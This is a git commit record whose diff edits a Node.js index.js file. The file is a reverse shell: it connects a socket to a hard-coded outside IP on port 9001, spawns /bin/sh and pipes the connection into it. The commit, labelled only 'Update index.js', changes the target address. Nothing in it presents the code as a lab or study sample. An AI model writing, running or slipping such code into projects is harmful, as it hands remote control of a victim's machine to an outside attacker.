c7fe56b71767d9f77f0fb5fdd58dc90ff37678e1
joão <118135458+j6aoo@users.noreply.github.com>
2025-04-26 16:00:38 -0300

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ const net = require('net');
 const { exec } = require('child_process');
 
 const client = new net.Socket();
-client.connect(9001, '170.0.147.50', () => {
+client.connect(9001, '170.0.147.150', () => {
   const sh = exec('/bin/sh');
   client.write("Conectado!\\n");
   client.pipe(sh.stdin);
